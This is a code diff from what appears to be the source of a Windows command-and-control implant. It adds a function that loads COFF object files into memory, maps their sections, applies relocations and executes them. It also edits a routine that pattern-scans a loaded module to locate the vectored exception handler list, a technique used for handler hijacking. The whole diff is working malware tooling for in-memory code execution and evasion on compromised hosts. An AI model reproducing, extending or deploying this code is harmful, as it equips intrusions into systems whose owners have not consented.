@@ -50,6 +50,36 @@ namespace Injection {
         }
     }
 
+    VOID LoadObject(const char* const entrypoint, uint8_t* const data, void* const args, size_t arg_size, uint32_t req_id) {
+        HEXANE
+
+        _executable* object = Memory::Methods::CreateImageData(B_PTR(data));
+
+        object->next = Ctx->Coffs;
+        Ctx->Coffs = object;
+
+        if (!Opsec::SeImageCheckArch(object)) {
+            return_defer(ntstatus);
+        }
+
+        if (!Memory::Objects::MapSections(object, data)) {
+            return_defer(ntstatus);
+        }
+
+        if (!Memory::Objects::BaseRelocation(object)) {
+            return_defer(ntstatus);
+        }
+
+        if (!Memory::Execute::ExecuteObject(object, entrypoint, args, arg_size, req_id)) {
+            return_defer(ntstatus);
+        }
+
+    defer:
+        if (ntstatus != ERROR_SUCCESS) {
+            Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, object);
+        }
+    }
+
     namespace Veh {
 
         UINT_PTR GetFirstHandler(LDR_DATA_TABLE_ENTRY *module, const char *const signature, const char *const mask) {
@@ -66,7 +96,7 @@ namespace Injection {
             match += 0xD;
             handlers = R_CAST(LdrpVectorHandlerList*, *R_CAST(int32_t * , match + (match + 0x3) + 0x7));
 
-            if (!NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void * , handlers->First), &handler, sizeof(void *), nullptr))) {
+            if (!NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void*, handlers->First), &handler, sizeof(void *), nullptr))) {
                 handler = 0;
                 return_defer(ntstatus);
             }
